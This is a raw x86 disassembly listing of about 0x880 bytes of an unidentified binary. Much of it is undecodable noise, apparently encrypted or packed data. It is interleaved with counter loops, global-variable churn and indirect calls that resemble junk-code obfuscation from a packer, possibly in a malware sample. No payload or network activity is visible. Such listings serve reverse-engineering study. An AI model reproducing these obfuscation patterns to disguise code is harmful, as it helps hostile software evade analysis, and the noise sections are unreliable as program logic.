  40a2a5:	xor    dl,BYTE PTR [ecx-0x69]
  40a2a8:	je     0x40a253
  40a2aa:	test   DWORD PTR [edx+0x3c],edi
  40a2ad:	ins    BYTE PTR es:[edi],dx
  40a2ae:	xchg   ebp,eax
  40a2af:	sub    eax,0x7f14862e
  40a2b4:	in     eax,dx
  40a2b5:	(bad)  
  40a2b6:	aad    0xd
  40a2b8:	sub    al,0xd8
  40a2ba:	gs and eax,0x34
  40a2be:	mov    ds:0x88b4e840,al
  40a2c3:	sub    eax,DWORD PTR [eax+0x33]
  40a2c6:	mov    cl,0x96
  40a2c8:	retf   0x2583
  40a2cb:	push   es
  40a2cc:	xchg   edi,eax
  40a2cd:	nop
  40a2ce:	inc    edi
  40a2cf:	lahf   
  40a2d0:	cmp    eax,0x9b5b9351
  40a2d5:	xor    BYTE PTR [ecx+0x3e],ah
  40a2d8:	out    dx,al
  40a2d9:	sub    al,0x87
  40a2db:	adc    al,0xbf
  40a2dd:	movd   eax,mm1
  40a2e0:	(bad)  
  40a2e1:	in     al,dx
  40a2e2:	cli    
  40a2e3:	add    BYTE PTR [bp+si],0xac
  40a2e7:	lds    edi,FWORD PTR [eax+0x4fb8898e]
  40a2ed:	in     eax,dx
  40a2ee:	jmp    0x6cf8:0x999155e1
  40a2f5:	xor    al,0x51
  40a2f7:	mov    WORD PTR [eax-0x315bf5c1],cs
  40a2fd:	pop    ds
  40a2fe:	mov    si,0x18b8
  40a302:	dec    ebx
  40a303:	jge    0x40a2f8
  40a305:	ss (bad) 
  40a307:	retf   
  40a308:	push   eax
  40a309:	and    ebp,0xaa05dd1d
  40a30f:	loopne 0x40a29d
  40a311:	std    
  40a312:	outs   dx,BYTE PTR ds:[esi]
  40a313:	icebp  
  40a314:	imul   esi,DWORD PTR [eax+0x4ffcb030],0xffffffd7
  40a31b:	ret    0xd52
  40a31e:	cmp    DWORD PTR [ebp+0x2e],ecx
  40a321:	cmp    DWORD PTR [ebp+ecx*4+0x6e7b60f8],esp
  40a328:	xor    DWORD PTR [esi-0x16],ecx
  40a32b:	push   esp
  40a32c:	xchg   ebp,eax
  40a32d:	mov    cl,0x97
  40a32f:	shl    esi,0x26
  40a332:	add    esp,ecx
  40a334:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a335:	push   esi
  40a336:	jg     0x40a381
  40a338:	dec    BYTE PTR ds:0x65ee6f88
  40a33e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a33f:	sbb    al,0x1d
  40a341:	pushf  
  40a342:	push   ecx
  40a343:	test   al,0x8e
  40a345:	cli    
  40a346:	rcr    BYTE PTR [edx],0x98
  40a349:	pop    esp
  40a34a:	in     eax,0xc
  40a34c:	xchg   esp,edi
  40a34e:	sbb    BYTE PTR [ebx+esi*1+0x7a],0xe7
  40a353:	dec    esi
  40a354:	(bad)  
  40a355:	inc    ebx
  40a356:	dec    BYTE PTR [edi-0x66]
  40a359:	ret    0xd866
  40a35c:	mov    ah,0xd9
  40a35e:	jmp    0x5e06:0x213ff822
  40a365:	in     eax,dx
  40a366:	fisttp WORD PTR [eax-0x6a]
  40a369:	cld    
  40a36a:	or     DWORD PTR [edx-0x56c0b714],edi
  40a370:	out    0xdb,al
  40a372:	xor    dh,bl
  40a374:	and    ebx,DWORD PTR [esi]
  40a376:	(bad)  
  40a377:	pop    esp
  40a378:	jmp    0xa574885b
  40a37d:	inc    ebp
  40a37e:	icebp  
  40a37f:	outs   dx,BYTE PTR ds:[esi]
  40a380:	sar    BYTE PTR [edi-0xe],cl
  40a383:	jmp    0x40a31c
  40a385:	push   esi
  40a386:	(bad)  
  40a387:	aas    
  40a388:	test   BYTE PTR [ebx-0x7f],cl
  40a38b:	jp     0x40a3c7
  40a38d:	lods   al,BYTE PTR ds:[esi]
  40a38e:	cmp    ecx,DWORD PTR [ecx-0x6c900f55]
  40a394:	jo     0x40a33f
  40a396:	call   0x762ad862
  40a39b:	xor    bl,0xba
  40a39e:	loop   0x40a3a9
  40a3a0:	cmp    eax,0x6b435702
  40a3a5:	sbb    BYTE PTR [ecx+0x51],cl
  40a3a8:	jo     0x40a376
  40a3aa:	out    0xe6,eax
  40a3ac:	cld    
  40a3ad:	out    0x32,eax
  40a3af:	push   es
  40a3b0:	cmp    eax,0x60325e4b
  40a3b5:	pop    esi
  40a3b6:	lds    ebx,FWORD PTR [ecx-0x42]
  40a3b9:	xlat   BYTE PTR ds:[ebx]
  40a3ba:	pop    edi
  40a3bb:	cmc    
  40a3bc:	scas   al,BYTE PTR es:[edi]
  40a3bd:	mov    bh,0xb7
  40a3bf:	mov    ebp,0x69aa395a
  40a3c4:	dec    edi
  40a3c5:	and    bl,BYTE PTR [ebp+0xc]
  40a3c8:	push   ecx
  40a3c9:	jmp    0x40a403
  40a3cb:	scas   al,BYTE PTR es:[edi]
  40a3cc:	inc    edi
  40a3cd:	aam    0xca
  40a3cf:	jge    0x40a3a8
  40a3d1:	out    0xdd,al
  40a3d3:	pushf  
  40a3d4:	add    DWORD PTR [ebp-0x3b],ecx
  40a3d7:	or     ecx,DWORD PTR [esi-0x56]
  40a3da:	int    0x60
  40a3dc:	pop    ebp
  40a3dd:	jl     0x40a3cb
  40a3df:	jmp    0x40a416
  40a3e1:	js     0x40a3f9
  40a3e3:	mov    dh,0x27
  40a3e5:	mov    bl,0x48
  40a3e7:	push   0xffffffa7
  40a3e9:	pavgb  mm1,QWORD PTR [edx+0x6]
  40a3ed:	mov    ds:0x24e0c23c,eax
  40a3f2:	xor    DWORD PTR [esi-0x7ed4b009],esp
  40a3f8:	aam    0xc7
  40a3fa:	inc    ebp
  40a3fb:	aam    0x3b
  40a3fd:	test   DWORD PTR [eax+edi*8+0x3ad045c7],ebx
  40a404:	test   DWORD PTR [eax+edi*8+0x45c7ff0b],ebx
  40a40b:	int3   
  40a40c:	cmp    eax,0x1bf89c85
  40a411:	cmp    eax,0x434687
  40a416:	mov    DWORD PTR [ebp-0x38],0xf89c853c
  40a41d:	mov    DWORD PTR ds:0x4345f3,0x13
  40a427:	cmp    DWORD PTR ds:0x4345f3,0x0
  40a42e:	je     0x40a4bc
  40a434:	cmp    DWORD PTR ds:0x4345f3,0x21
  40a43b:	jne    0x40a44c
  40a441:	push   0x43470f
  40a446:	call   DWORD PTR ds:0x413338
  40a44c:	xor    edi,edi
  40a44e:	xor    edi,DWORD PTR ds:0x4345f3
  40a454:	dec    edi
  40a455:	mov    DWORD PTR ds:0x4345f3,edi
  40a45b:	jmp    0x40a427
  40a460:	and    DWORD PTR ds:0x4346fb,0x0
  40a46a:	mov    edx,DWORD PTR ds:0x4346fb
  40a470:	inc    edx
  40a471:	mov    DWORD PTR ds:0x4346fb,edx
  40a477:	cmp    DWORD PTR ds:0x4346fb,0x21
  40a47e:	jne    0x40a4a9
  40a484:	push   0x18fd
  40a489:	push   0x7257
  40a48e:	push   DWORD PTR [ebp-0xc]
  40a491:	push   0x4346b7
  40a496:	push   0x5f6e
  40a49b:	push   DWORD PTR [ebp-0xc]
  40a49e:	push   0x4349a7
  40a4a3:	call   DWORD PTR ds:0x41333c
  40a4a9:	cmp    DWORD PTR ds:0x4346fb,0x15
  40a4b0:	jb     0x40a46a
  40a4b6:	or     DWORD PTR ds:0x43464b,ebx
  40a4bc:	mov    DWORD PTR [ebp-0x3c],0xf89c853f
  40a4c3:	sbb    edi,0x2ba6
  40a4c9:	mov    edx,DWORD PTR [ebp+0x8]
  40a4cc:	xor    edx,eax
  40a4ce:	sub    DWORD PTR ds:0x434693,ecx
  40a4d4:	mov    edi,DWORD PTR [ebp-0x10]
  40a4d7:	or     DWORD PTR ds:0x434653,0x43464f
  40a4e1:	add    edx,ecx
  40a4e3:	cmp    edi,edx
  40a4e5:	je     0x40e6c9
  40a4eb:	mov    DWORD PTR ds:0x434677,0x7850
  40a4f5:	push   ebx
  40a4f6:	jmp    0x40de76
  40a4fb:	xor    DWORD PTR ds:0x434677,0x535d
  40a505:	mov    edx,DWORD PTR [ebp-0x8]
  40a508:	add    DWORD PTR ds:0x434703,edx
  40a50e:	mov    edi,DWORD PTR [ebp-0x10]
  40a511:	add    DWORD PTR ds:0x4346cb,0x43467b
  40a51b:	sub    edi,edx
  40a51d:	mov    DWORD PTR ds:0x43464f,0x500e
  40a527:	mov    edx,DWORD PTR [ebp-0x4]
  40a52a:	and    DWORD PTR ds:0x43464f,0x1370
  40a534:	xor    edx,eax
  40a536:	add    DWORD PTR ds:0x4345f3,0x35ec
  40a540:	add    edx,ecx
  40a542:	mov    DWORD PTR ds:0x4345fb,0xac0
  40a54c:	cmp    edi,edx
  40a54e:	mov    DWORD PTR ds:0x4346fb,0x5818
  40a558:	jb     0x40e2b1
  40a55e:	mov    ebx,DWORD PTR ds:0x434717
  40a564:	mov    edx,DWORD PTR ds:0x434727
  40a56a:	sub    ebx,edx
  40a56c:	xor    ebx,DWORD PTR [ebx+edx*1]
  40a56f:	mov    edx,DWORD PTR [ebp-0x28]
  40a572:	mov    edi,DWORD PTR [ebp-0x4]
  40a575:	and    DWORD PTR ds:0x43463f,0x0
  40a57f:	mov    ebx,DWORD PTR ds:0x43463f
  40a585:	inc    ebx
  40a586:	mov    DWORD PTR ds:0x43463f,ebx
  40a58c:	cmp    DWORD PTR ds:0x43463f,0x9
  40a593:	jne    0x40a5a2
  40a599:	push   DWORD PTR [ebp-0x20]
  40a59c:	call   DWORD PTR ds:0x413340
  40a5a2:	cmp    DWORD PTR ds:0x43463f,0x8
  40a5a9:	jne    0x40a5bc
  40a5af:	mov    ebx,DWORD PTR ds:0x43463f
  40a5b5:	inc    ebx
  40a5b6:	mov    DWORD PTR ds:0x43463f,ebx
  40a5bc:	cmp    DWORD PTR ds:0x43463f,0x1c
  40a5c3:	jb     0x40a57f
  40a5c9:	xor    edx,eax
  40a5cb:	inc    ebx
  40a5cc:	xor    edi,eax
  40a5ce:	sbb    ebx,DWORD PTR ds:0x43467f
  40a5d4:	add    edi,ecx
  40a5d6:	or     DWORD PTR ds:0x434637,ecx
  40a5dc:	add    edx,ecx
  40a5de:	imul   edx,edi
  40a5e1:	mov    edi,DWORD PTR [ebp-0x8]
  40a5e4:	mov    DWORD PTR ds:0x43464b,0x1b
  40a5ee:	cmp    DWORD PTR ds:0x43464b,0x0
  40a5f5:	je     0x40a629
  40a5fb:	cmp    DWORD PTR ds:0x43464b,0x1d
  40a602:	jne    0x40a611
  40a608:	push   DWORD PTR [ebp-0x10]
  40a60b:	call   DWORD PTR ds:0x413404
  40a611:	mov    ebx,DWORD PTR ds:0x43464b
  40a617:	dec    ebx
  40a618:	mov    DWORD PTR ds:0x43464b,ebx
  40a61e:	jmp    0x40a5ee
  40a623:	and    DWORD PTR ds:0x4346c7,ecx
  40a629:	mov    ebx,DWORD PTR [ebp-0x10]
  40a62c:	sub    ebx,edi
  40a62e:	cmp    ebx,edx
  40a630:	mov    DWORD PTR ds:0x43463f,0x5ce6
  40a63a:	ja     0x40aa85
  40a640:	xor    edx,edx
  40a642:	add    edx,DWORD PTR ds:0x4346bf
  40a648:	add    DWORD PTR ds:0x434713,edx
  40a64e:	mov    edx,DWORD PTR [ebp-0x4]
  40a651:	or     DWORD PTR ds:0x43467f,0x434707
  40a65b:	jmp    0x40aa72
  40a660:	xchg   edx,eax
  40a661:	dec    ebx
  40a662:	in     al,0xe
  40a664:	in     eax,dx
  40a665:	test   eax,0x2c38537c
  40a66a:	out    0x8f,eax
  40a66c:	xchg   BYTE PTR [ecx],ch
  40a66e:	das    
  40a66f:	daa    
  40a670:	cli    
  40a671:	bnd jle 0x40a6f2
  40a674:	jo     0x40a6ef
  40a676:	jle    0x40a6f6
  40a678:	fisttp DWORD PTR [ecx+eiz*8-0x7d]
  40a67c:	stos   DWORD PTR es:[edi],eax
  40a67d:	pop    edx
  40a67e:	push   cs
  40a67f:	mov    ecx,0x82ab6320
  40a684:	adc    BYTE PTR [edx-0x4d2d9239],0x72
  40a68b:	and    BYTE PTR [edi+ebx*2+0x65390435],bh
  40a692:	xor    al,0x59
  40a694:	bound  esp,QWORD PTR [edx+0x45]
  40a697:	enter  0xced9,0x9d
  40a69b:	(bad)  
  40a69c:	je     0x40a663
  40a69e:	pushf  
  40a69f:	mov    ebp,0xb8475643
  40a6a4:	dec    edi
  40a6a5:	scas   al,BYTE PTR es:[edi]
  40a6a6:	sub    ecx,DWORD PTR [ecx]
  40a6a8:	test   al,0xc8
  40a6aa:	in     eax,0x1e
  40a6ac:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a6ad:	sub    BYTE PTR [ebp+eax*8+0x1df552e3],dh
  40a6b4:	daa    
  40a6b5:	mov    edi,0xdf5f65aa
  40a6ba:	out    0x87,al
  40a6bc:	cli    
  40a6bd:	pop    ebx
  40a6be:	lock imul esi,DWORD PTR [ebx+0xf],0x5153eec9
  40a6c6:	fwait
  40a6c7:	dec    esi
  40a6c8:	mov    cl,0x17
  40a6ca:	(bad)  
  40a6cb:	jle    0x40a742
  40a6cd:	sub    eax,0x8827959
  40a6d2:	jns    0x40a703
  40a6d4:	fwait
  40a6d5:	cmp    DWORD PTR [ebp+0x5402f3eb],ebx
  40a6db:	add    al,0x48
  40a6dd:	sub    ch,BYTE PTR ds:0x1ef20242
  40a6e3:	cld    
  40a6e4:	sub    DWORD PTR [ecx-0x6c],edi
  40a6e7:	mov    eax,ds:0x4e1fa7fa
  40a6ec:	mov    ch,0x63
  40a6ee:	fnstenv [ebx]
  40a6f0:	push   esi
  40a6f1:	sbb    ecx,ebx
  40a6f3:	repz cmp BYTE PTR [ecx+0x1d],0x22
  40a6f8:	xor    al,0xec
  40a6fa:	cdq    
  40a6fb:	mov    ds:0x9ef1ada0,al
  40a700:	(bad)  
  40a701:	sbb    eax,0xa45018e6
  40a706:	jbe    0x40a76e
  40a708:	cmc    
  40a709:	(bad)  [eax]
  40a70b:	inc    ecx
  40a70c:	into   
  40a70d:	pushf  
  40a70e:	jb     0x40a747
  40a710:	lock mov bh,0x87
  40a713:	mov    bl,0x32
  40a715:	push   es
  40a716:	and    eax,esi
  40a718:	pop    edi
  40a719:	cld    
  40a71a:	lahf   
  40a71b:	(bad)  [ebx]
  40a71d:	sbb    bh,bh
  40a71f:	mov    gs:0xfdfe78b7,al
  40a725:	sbb    al,0x88
  40a727:	push   es
  40a728:	adc    al,0xdd
  40a72a:	mov    ebx,?
  40a72c:	mov    ah,0x58
  40a72e:	shr    BYTE PTR [ecx+0x7],cl
  40a731:	add    DWORD PTR [edi-0x2e],ebx
  40a734:	out    0xb7,eax
  40a736:	hlt    
  40a737:	scas   eax,DWORD PTR es:[edi]
  40a738:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40a739:	xchg   ch,bl
  40a73b:	lds    edx,FWORD PTR [esi+edx*4-0x13]
  40a73f:	fdiv   DWORD PTR ds:0x325db4ed
  40a745:	pop    es
  40a746:	aaa    
  40a747:	inc    esp
  40a748:	rcl    DWORD PTR [ebp-0x20],0x5c
  40a74c:	je     0x40a783
  40a74e:	mov    al,0xf7
  40a750:	cwde   
  40a751:	(bad)  
  40a752:	mov    ah,0x20
  40a754:	test   BYTE PTR [edi-0x16],0xeb
  40a758:	mov    ah,0xe4
  40a75a:	mov    esi,0x4fd968d7
  40a75f:	xchg   edx,eax
  40a760:	xchg   esi,eax
  40a761:	or     dl,BYTE PTR [ebx+0x46]
  40a764:	mov    ebx,0xe4b40487
  40a769:	les    ecx,FWORD PTR [ecx]
  40a76b:	stos   BYTE PTR es:[edi],al
  40a76c:	repz fwait
  40a76e:	mov    ebx,0x81337362
  40a773:	(bad)  
  40a774:	jmp    0xe0dcb22f
  40a779:	das    
  40a77a:	daa    
  40a77b:	fisttp WORD PTR ds:0x9e3c8143
  40a781:	mov    eax,ds:0x76ca554e
  40a786:	std    
  40a787:	inc    ebx
  40a788:	mov    ebp,0xb351f0ef
  40a78d:	sub    ebp,ebp
  40a78f:	add    esp,DWORD PTR [esi-0x79]
  40a792:	or     edi,DWORD PTR [edi-0x24]
  40a795:	xor    al,0xe7
  40a797:	sbb    ecx,esi
  40a799:	push   ecx
  40a79a:	cli    
  40a79b:	mov    ebp,0xc5cbc2af
  40a7a0:	cmp    edi,eax
  40a7a2:	and    BYTE PTR [ecx+0x595000e2],0x2
  40a7a9:	mov    bl,0xad
  40a7ab:	std    
  40a7ac:	mov    eax,0x8fb617ca
  40a7b1:	repnz fdiv DWORD PTR [edx-0x2a]
  40a7b5:	dec    ebp
  40a7b6:	push   esp
  40a7b7:	pop    ebp
  40a7b8:	(bad)  
  40a7b9:	das    
  40a7ba:	sbb    eax,0x6bd5fcaa
  40a7bf:	outs   dx,BYTE PTR ds:[esi]
  40a7c0:	mov    edi,0xf668aac5
  40a7c5:	retf   0x8a25
  40a7c8:	aas    
  40a7c9:	jae    0x40a7e2
  40a7cb:	xlat   BYTE PTR ds:[ebx]
  40a7cc:	aad    0x3e
  40a7ce:	daa    
  40a7cf:	xor    DWORD PTR [edx],esi
  40a7d1:	inc    esi
  40a7d2:	xlat   BYTE PTR ds:[ebx]
  40a7d3:	lahf   
  40a7d4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a7d5:	xor    bh,bh
  40a7d7:	and    al,0x13
  40a7d9:	adc    eax,DWORD PTR [ecx+0x3eaedb65]
  40a7df:	nop
  40a7e0:	loope  0x40a824
  40a7e2:	jl     0x40a7bf
  40a7e4:	inc    ebx
  40a7e5:	(bad)
  40a7e8:	stos   BYTE PTR es:[edi],al
  40a7e9:	ss mov esp,0x93d73d29
  40a7ef:	mov    bl,0xbc
  40a7f1:	jg     0x40a81a
  40a7f3:	and    DWORD PTR [ebx+edx*4-0x1e16c527],edi
  40a7fa:	inc    edx
  40a7fb:	mov    eax,ds:0x3e353370
  40a800:	cli    
  40a801:	cdq    
  40a802:	xchg   ebp,eax
  40a803:	cmp    esi,edi
  40a805:	xchg   esi,eax
  40a806:	push   eax
  40a807:	test   eax,0x6cb26894
  40a80c:	push   ebp
  40a80d:	inc    ecx
  40a80e:	ins    BYTE PTR es:[edi],dx
  40a80f:	sbb    eax,0x7acc6784
  40a814:	jo     0x40a825
  40a816:	mov    dh,0x58
  40a818:	in     eax,dx
  40a819:	and    DWORD PTR [ebp+0x7],0x8ac73958
  40a820:	sbb    esi,DWORD PTR [edi]
  40a822:	add    BYTE PTR [esi*8-0x3b15c521],al
  40a829:	or     cl,bl
  40a82b:	mov    BYTE PTR [ebp-0x511c221d],bl
  40a831:	int    0x49
  40a833:	dec    ebx
  40a834:	mov    ah,0x9e
  40a836:	adc    eax,0xb4869872
  40a83b:	ret    
  40a83c:	jecxz  0x40a7e5
  40a83e:	pop    es
  40a83f:	inc    esi
  40a840:	push   ds
  40a841:	mov    bl,0xfe
  40a843:	aaa    
  40a844:	jmp    0xb35b:0xdc5d5413
  40a84b:	clc    
  40a84c:	mov    dh,0xd8
  40a84e:	pop    ds
  40a84f:	pop    edi
  40a850:	inc    eax
  40a851:	pop    ecx
  40a852:	cmc    
  40a853:	popf   
  40a854:	xchg   esp,eax
  40a855:	scas   eax,DWORD PTR es:[edi]
  40a856:	jmp    0x40a882
  40a858:	sbb    eax,0x2d863343
  40a85d:	sbb    ch,dh
  40a85f:	and    DWORD PTR [ebp-0x3a898674],esp
  40a865:	mov    bh,0xa
  40a867:	fwait
  40a868:	test   ebp,ebx
  40a86a:	cdq    
  40a86b:	adc    eax,0xfa6a8041
  40a870:	fs jecxz 0x40a8cf
  40a873:	(bad)  
  40a874:	(bad)  
  40a875:	fcomp  DWORD PTR [ecx+ebp*8]
  40a878:	aad    0x79
  40a87a:	mov    eax,ds:0x1b66199b
  40a87f:	hlt    
  40a880:	push   esi
  40a881:	outs   dx,DWORD PTR ds:[esi]
  40a882:	(bad)  
  40a883:	mov    ds:0x501644f4,eax
  40a888:	shr    cl,cl
  40a88a:	ja     0x40a8ca
  40a88c:	sbb    eax,0x452949b5
  40a891:	xchg   ebp,eax
  40a892:	xor    DWORD PTR [ebx+0x6a7f79d6],ebp
  40a898:	adc    edi,DWORD PTR [edi]
  40a89a:	ss das 
  40a89c:	pop    ebx
  40a89d:	aad    0xee
  40a89f:	or     eax,0x6268ec4a
  40a8a4:	xchg   cx,ax
  40a8a6:	add    bh,bl
  40a8a8:	xor    eax,0x364b5031
  40a8ad:	ret    
  40a8ae:	ffree  st(7)
  40a8b0:	into   
  40a8b1:	cmc    
  40a8b2:	inc    esi
  40a8b3:	jg     0x40a8b0
  40a8b5:	popf   
  40a8b6:	push   ecx
  40a8b7:	out    dx,eax
  40a8b8:	pop    ss
  40a8b9:	adc    al,cl
  40a8bb:	loop   0x40a8e9
  40a8bd:	xlat   BYTE PTR ds:[ebx]
  40a8be:	dec    esp
  40a8bf:	add    DWORD PTR [edx+0x1e],eax
  40a8c2:	into   
  40a8c3:	ret    
  40a8c4:	pusha  
  40a8c5:	(bad)  [esi-0x48f4ec5b]
  40a8cb:	push   eax
  40a8cc:	and    bh,0xa2
  40a8cf:	jp     0x40a940
  40a8d1:	xchg   edx,eax
  40a8d2:	loop   0x40a8dc
  40a8d4:	out    dx,eax
  40a8d5:	ror    BYTE PTR [edx-0x2a],1
  40a8d8:	jmp    0x8cb6:0x2bccd03b
  40a8df:	sbb    esp,esp
  40a8e1:	push   edx
  40a8e2:	xchg   esp,eax
  40a8e3:	scas   eax,DWORD PTR es:[edi]
  40a8e4:	push   edx
  40a8e5:	or     esi,DWORD PTR [ecx-0x72]
  40a8e8:	into   
  40a8e9:	mov    dh,0x80
  40a8eb:	pop    ecx
  40a8ec:	adc    edi,DWORD PTR [edx-0x45683a6]
  40a8f2:	or     al,BYTE PTR [ecx+0x1c]
  40a8f5:	dec    ecx
  40a8f6:	stos   DWORD PTR es:[edi],eax
  40a8f7:	xchg   esp,eax
  40a8f8:	mov    ecx,0x4d1f70fc
  40a8fd:	jnp    0x40a969
  40a8ff:	xchg   esp,ebp
  40a901:	jbe    0x40a8cc
  40a903:	mov    esp,0x67f8eb0e
  40a908:	out    dx,eax
  40a909:	adc    eax,0xe503a14d
  40a90e:	cmp    esi,edi
  40a910:	lahf   
  40a911:	in     al,dx
  40a912:	fs cwde 
  40a914:	loope  0x40a976
  40a916:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a917:	and    edi,ebp
  40a919:	enter  0x23ae,0x40
  40a91d:	cwde   
  40a91e:	push   ecx
  40a91f:	(bad)  
  40a922:	adc    bl,cl
  40a924:	sbb    edi,DWORD PTR [edx]
  40a926:	mov    ah,0x70
  40a928:	mov    WORD PTR [ebx],fs
  40a92a:	inc    ebp
  40a92b:	xor    DWORD PTR [ebp+0x14e8734f],0x53
  40a932:	retf   0x12ea
  40a935:	sahf   
  40a936:	fsubr  DWORD PTR [eax]
  40a938:	aas    
  40a939:	fistp  DWORD PTR ds:0x6c689fa0
  40a93f:	bnd jmp 0x70cdb095
  40a945:	sub    eax,0x32857ea
  40a94a:	gs dec esi
  40a94c:	mov    DWORD PTR [ebp+0x1cd54501],edx
  40a952:	ss arpl si,sp
  40a955:	pop    edx
  40a956:	dec    ebp
  40a957:	pop    esi
  40a958:	arpl   WORD PTR [eax-0x7332d3b],sp
  40a95e:	cmp    al,0x86
  40a960:	es je  0x40a973
  40a963:	ret    0x913a
  40a966:	pusha  
  40a967:	and    ebp,esi
  40a969:	dec    eax
  40a96a:	std    
  40a96b:	test   eax,0x77bba398
  40a970:	lods   eax,DWORD PTR ds:[esi]
  40a971:	and    BYTE PTR [eax+0x20],0x0
  40a975:	xchg   edi,eax
  40a976:	ror    BYTE PTR [eax+0x3d],1
  40a979:	dec    edx
  40a97a:	xor    DWORD PTR ds:0x3af7ddae,esi
  40a980:	cmp    ebp,ecx
  40a982:	or     DWORD PTR [ebx],ecx
  40a984:	mov    ebp,ebx
  40a986:	cmp    eax,0x1a18278d
  40a98b:	lahf   
  40a98c:	pop    edi
  40a98d:	mov    bh,al
  40a98f:	cdq    
  40a990:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a991:	mov    ecx,0xc8d7997d
  40a996:	mov    dl,0x0
  40a998:	cs mov ebx,0x53be4203
  40a99e:	sub    al,0xad
  40a9a0:	push   edx
  40a9a1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a9a2:	bound  ebp,QWORD PTR fs:[edx-0x50]
  40a9a6:	jecxz  0x40a934
  40a9a8:	(bad)  
  40a9a9:	or     eax,0xe479daae
  40a9ae:	cmp    eax,0xd5e21d58
  40a9b3:	cmc    
  40a9b4:	addr16 pinsrw mm3,ebp,0x40
  40a9b9:	xor    eax,0xd2a0b1b9
  40a9be:	outs   dx,DWORD PTR ds:[esi]
  40a9bf:	(bad)  
  40a9c0:	loop   0x40a9c2
  40a9c2:	mov    ds:0xeb10faa3,eax
  40a9c7:	lods   al,BYTE PTR ds:[esi]
  40a9c8:	or     BYTE PTR [esp+ebx*1],bh
  40a9cb:	popa   
  40a9cc:	jmp    0x40aa31
  40a9ce:	out    dx,eax
  40a9cf:	dec    edi
  40a9d0:	out    dx,al
  40a9d1:	cmp    ah,BYTE PTR [ebp-0x464c3478]
  40a9d7:	cmp    dh,BYTE PTR [esi-0x6cd9c83d]
  40a9dd:	popa   
  40a9de:	dec    eax
  40a9df:	or     eax,0xad0fa5a8
  40a9e4:	xor    eax,0x2ad286de
  40a9e9:	xor    esp,DWORD PTR [ebx-0x70]
  40a9ec:	aaa    
  40a9ed:	gs (bad) 
  40a9ef:	xor    eax,0x61c598a7
  40a9f4:	or     ecx,DWORD PTR [edx+0x16163e72]
  40a9fa:	cld    
  40a9fb:	sbb    edx,DWORD PTR [edi]
  40a9fd:	lahf   
  40a9fe:	nop
  40a9ff:	xchg   BYTE PTR [ebp+0xfb425fc],bh
  40aa05:	push   0xffffffd3
  40aa07:	stc    
  40aa08:	stc    
  40aa09:	pusha  
  40aa0a:	fld    QWORD PTR ds:0xb04e3fa
  40aa10:	popa   
  40aa11:	cld    
  40aa12:	(bad)  [edx]
  40aa14:	sub    eax,0x5ea082c9
  40aa19:	pop    esp
  40aa1a:	sub    BYTE PTR [esi-0x68],dh
  40aa1d:	mov    ds:0x9611bc5b,eax
  40aa22:	jge    0x40aa44
  40aa24:	cmc    
  40aa25:	mov    esi,0xecfe7f6a
  40aa2a:	jno    0x40aaab
  40aa2c:	call   0x35b7:0x66c1244
  40aa33:	add    ecx,DWORD PTR [ecx+0x44ebe608]
  40aa39:	add    esi,DWORD PTR [esi]
  40aa3b:	jmp    0x357638b9
  40aa40:	aad    0x98
  40aa42:	pop    esp
  40aa43:	xor    eax,0xf54e1017
  40aa48:	and    eax,0x1d936f50
  40aa4d:	push   ds
  40aa4e:	fadd   DWORD PTR [edx+0x2f]
  40aa51:	ret    
  40aa52:	pop    edx
  40aa53:	add    BYTE PTR [eax+0x2a4fc057],bl
  40aa59:	add    ah,BYTE PTR [eax]
  40aa5b:	push   eax
  40aa5c:	jb     0x40aa2e
  40aa5e:	xor    DWORD PTR [edi+0x5c8c6b39],esp
  40aa64:	mov    DWORD PTR [edx],esp
  40aa66:	out    0x9a,eax
  40aa68:	cmc    
  40aa69:	xor    al,0xfa
  40aa6b:	outs   dx,BYTE PTR ds:[esi]
  40aa6c:	push   ss
  40aa6d:	or     eax,0x937376e9
  40aa72:	xor    edx,eax
  40aa74:	adc    DWORD PTR ds:0x434653,0x43467f
  40aa7e:	add    edx,ecx
  40aa80:	jmp    0x40c4f6
  40aa85:	mov    edx,DWORD PTR [ebp-0x2c]
  40aa88:	sub    DWORD PTR ds:0x4345f3,0x7416
  40aa92:	mov    edi,DWORD PTR [ebp-0x4]
  40aa95:	mov    ebx,DWORD PTR ds:0x4346fb
  40aa9b:	sub    ebx,DWORD PTR ds:0x43470b
  40aaa1:	mov    DWORD PTR ds:0x4346fb,ebx
  40aaa7:	xor    edx,eax
  40aaa9:	xor    edi,eax
  40aaab:	or     ebx,0x1288
  40aab1:	add    edi,ecx
  40aab3:	adc    ebx,DWORD PTR ds:0x4346bb
  40aab9:	jmp    0x40aed0
  40aabe:	test   DWORD PTR [eax-0x4c324c3f],edi
  40aac4:	jne    0x40ab36
  40aac6:	xchg   ebx,eax
  40aac7:	in     eax,0x4e
  40aac9:	in     eax,dx
  40aaca:	pop    eax
  40aacb:	jae    0x40aa51
  40aacd:	xor    edi,esp
  40aacf:	(bad)  
  40aad0:	jle    0x40ab50
  40aad2:	jo     0x40ab4d
  40aad4:	jle    0x40ab54
  40aad6:	pushf  
  40aad7:	daa    
  40aad8:	mov    ch,0x5d
  40aada:	xchg   esp,eax
  40aadb:	or     eax,0x3dfed64
  40aae0:	leave  
  40aae1:	mov    edx,0xa1c476bc
  40aae6:	xchg   BYTE PTR [edi-0x7e],bl
  40aae9:	adc    BYTE PTR [esi],0xe3
  40aaec:	and    eax,0xa88f81f3
  40aaf1:	retf   0xf271
  40aaf4:	inc    edx
  40aaf5:	pop    edx
  40aaf6:	int    0x91
  40aaf8:	jl     0x40ab40
  40aafa:	lock hlt 
  40aafc:	pop    edx
  40aafd:	in     al,dx
  40aafe:	test   eax,0x126e3b1d
  40ab03:	cdq    
  40ab04:	jg     0x40ab01
  40ab06:	test   BYTE PTR [esi],ch
  40ab08:	mov    eax,ds:0x550d7c0f
  40ab0d:	sub    esp,DWORD PTR [edx+0x3abac9d]
  40ab13:	jge    0x40ab69
  40ab15:	stos   BYTE PTR es:[edi],al
  40ab16:	ficom  WORD PTR [edi+0x14755b9e]
  40ab1c:	loop   0x40ab23
  40ab1e:	enter  0x7f28,0xc0
  40ab22:	xchg   edi,eax
  40ab23:	lock sbb DWORD PTR [ebx],ecx
